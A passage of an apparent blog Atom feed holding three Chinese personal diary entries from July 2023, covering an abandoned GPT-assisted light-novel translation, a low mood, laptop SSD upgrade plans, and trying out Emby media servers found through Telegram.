-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>生而为人，我很抱歉。</p><span id="more"></span><h1 id="翻译"><a href="#翻译" class="headerlink" title="翻译"></a>翻译</h1><p>今天试了试翻译一部日语轻小说，先拿某一章试水。<br>前后翻译了有2个多小时，字数也就3000多。我还是拿着GPT翻的，gpt翻2次，把不一样或不通顺的地方进行人工或机翻校对。因为本身也不会日语，实在太慢了。<br>于是我放弃了。</p><h1 id="空虚"><a href="#空虚" class="headerlink" title="空虚"></a>空虚</h1><p>我大概是陷入了这样一种状态，什么都不想做。无论是学习也好，娱乐也罢。躺在床上，任时间流逝。我不知道为什么，于是得出了“我很抱歉”的结论。<br>也许我是一个彻头彻尾的虚无主义者。</p><p>如何才能摆脱这种状态呢？还是说应当拥抱。我不知，热情已逝。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;生而为人，我很抱歉。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>关于笔记本的事</title>
-    <link href="http://example.com/2023/07/24/Diary_20230724/"/>
-    <id>http://example.com/2023/07/24/Diary_20230724/</id>
-    <published>2023-07-23T16:00:00.000Z</published>
-    <updated>2023-07-24T16:40:18.809Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/images/loli.png" alt="loli"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>啊呀~</p><h1 id="笔记本的事"><a href="#笔记本的事" class="headerlink" title="笔记本的事"></a>笔记本的事</h1><p>今天突然想起，上个月说要对笔记本加装固态硬盘和对笔记本风扇清灰。直到现在才想起来。<br>于是我开始看固态硬盘价格，以前丢在购物出的：西部数据 SN770 1T 4.0 价格是374人民币。看了几家店铺都差不多，而且态度都很坚决不优惠。想起最近什么固态硬盘大降价的浪潮，于是我也懒得去讨价还价就买了。</p><p>然后是笔记本清灰这个问题，看了几篇视频教程，我的内心是有些犹豫的：到底自己干还是付钱让人做？<br>因为看某些教程感觉笔记本清灰有些复杂，稍有不慎就会造成多很多的损失，而且视频里的清理工具我也不全，再买又要等几天快递。但是交给别人清理我又心有不甘，一是自己的东西想自己处理，二是听说现在很多黑心商家会偷换零件之类的。</p><p>直到看到自己这部笔记本的同款清理过程，我下定决心要自己处理。虽然有些复杂，但看起来小心就没事。</p><h1 id="实习证明"><a href="#实习证明" class="headerlink" title="实习证明"></a>实习证明</h1><p>今天终于拿到实习证明了，对方公司的人到我这附近，几下子就取到了，很轻松~</p><h1 id="久违的鼻血"><a href="#久违的鼻血" class="headerlink" title="久违的鼻血"></a>久违的鼻血</h1><p>今天堂弟偶然路过我家，坐了会儿流鼻血了。下午吃麦当劳的时候我也突然流鼻血了。真不知道是巧合，还是什么规律？</p><h1 id="睡觉"><a href="#睡觉" class="headerlink" title="睡觉"></a>睡觉</h1><p>下午8点睡觉，睡到11点醒了。我还以为自己睡了很久。<br>看来在晚上8-11点之间不能睡啊，否则睡醒了就不想睡了。<br>我的身体已是晚睡的形状了。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>有点戒断反应了，今天已经不想洗头或洗澡了。心里开始给自己找理由。还好依然强迫了。第5天有这么个感觉，原来听说人养成习惯的时间依次是3，21，90天。或许每个人有不同的时间，我就是第5天。下次再有强烈想逆反的心理，就再记录下来吧。</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/loli.png&quot; alt=&quot;loli&quot;&gt;&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>流媒体再进一步</title>
-    <link href="http://example.com/2023/07/23/Diary_20230723/"/>
-    <id>http://example.com/2023/07/23/Diary_20230723/</id>
-    <published>2023-07-22T16:00:00.000Z</published>
-    <updated>2023-07-23T17:28:04.371Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/images/Christina_4.png" alt="牧濑红莉栖"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>差点关电脑了，别忘了强迫自己。</p><h1 id="emby"><a href="#emby" class="headerlink" title="emby"></a>emby</h1><p>emby这个东西真好用啊，2年曾经尝试过一次，但是当时可能不太感兴趣还是怎么着，没深入研究了。这次看到某个群好多人在用，想想是不是该试试。于是兴冲冲地尝试了。这个东西就是自己建媒体库，无论是电子书，音乐还是影视剧等等，都能放进去。不过大多数人还是喜欢拿来当作影视库吧，毕竟电子书靠z-library，音乐占空间相对而言也不大。</p><p>言归正传，下午的时候自己尝试搭了emby媒体库，但emby这种如果真想存很多资源，放在本地其实是有些划不来，或者说吃不消的，一般都放在服务器上，但放服务器上又要花钱和折腾，所以我自己简单尝试了几部片子之后便放弃了，虽然确实好用（把片子存到本地在emby上能自动显示封面海报和其它的各种信息之类的，UI也看着舒服）。</p><p>随后想到公益服，于是我在浏览器上搜，链接跑到Telegram频道了，再在tg里发现了几个不错的emby服务器，直接拿来用。这下子，我突然觉得什么bilibili会员，什么Netflix，什么Disney+索然无味。因为这些公益服里的资源实在太多了，而且质量也不错。这下子我决定除了nf，其它的都不充了。</p><p>那么来总结下吧：<br>优点：</p><ol><li>资源丰富，比任何单一平台资源都要多。</li><li>质量较高，有些资源质量比流媒体平台资源还高。</li><li>UI好看，界面风格和NF风格很相似。</li></ol><p>缺点：</p><ol><li>对于即时更新的资源时间会稍微慢1-5天。</li><li>无法对没看完的片子精准定位。</li><li>由于是民间经营，有可能跑路或偶尔断联。</li></ol><p>初步体验下来就这样，还能接受，反正免费方便，先试试看。</p><h1 id="说真的"><a href="#说真的" class="headerlink" title="说真的"></a>说真的</h1><p>吐槽一下：“说真的”，“老实说”。<br>有时为了加强想表达的内容，会习惯性地这么说。然而往往一说出口就觉得别扭。<br>原因就在于我感觉我绝大部分的话都是“说真的”或“老实说”，我要是开头这么说，那说得好像我平时讲话都是“说假的”或“不老实说”。<br>反而让我没那么想这么说了。</p><h1 id="末日孤雄"><a href="#末日孤雄" class="headerlink" title="末日孤雄"></a>末日孤雄</h1><p>昨日至今看完了一部日本的小说，叫做末日孤雄。关于在末日中主角被丧尸咬之后形成抗体从此再也不被丧尸袭击的故事。我看这部作品的简介有点兴趣，加上某网站上评分还可以。于是找来看，意外地很难找，不过还是顺利找到了，共60话有3章。<br>怎么说呢？稍微和预期之中有些不同，文笔还算看得下去。关于sex的描写有点多，大致统计了下有8，9处吧。是7年前的小说，甚至改编成了游戏。我也鬼使神差地下来玩了一点。感觉得到没写完，不过作者没写了，那也没办法。算是爽文题材作品。</p><h1 id="别人的世界"><a href="#别人的世界" class="headerlink" title="别人的世界"></a>别人的世界</h1><p>我挺喜欢看故事的，我有这个自觉。<br>对于小说，影视作品之类的这些会看不少。<br>不过我最近打算减少看故事作品的数量。<br>每一部作品都有着一个独特的世界，一直以来我喜欢去别的世界旅行。最近我决定不再如此了，无论是好是坏的作品，我都打算减少观看的时间。<br>因为无论如何，这些作品都是别人的世界，始终不是在自己的世界，我想要建造自己的世界。<br>把看其它作品的时间花在对自己世界的构筑上，比如自己创作一部全新的作品，或者续写别人的作品，最次也要翻译一部作品（有人说翻译也是一种创作）。<br>看看会有怎样的成效吧~</p>]]></content>
-    
-    
-    <summary type="html">&lt;p&gt;&lt;img src=&quot;/images/Christina_4.png&quot; alt=&quot;牧濑红莉栖&quot;&gt;&lt;/p&gt;</summary>
     
     
     
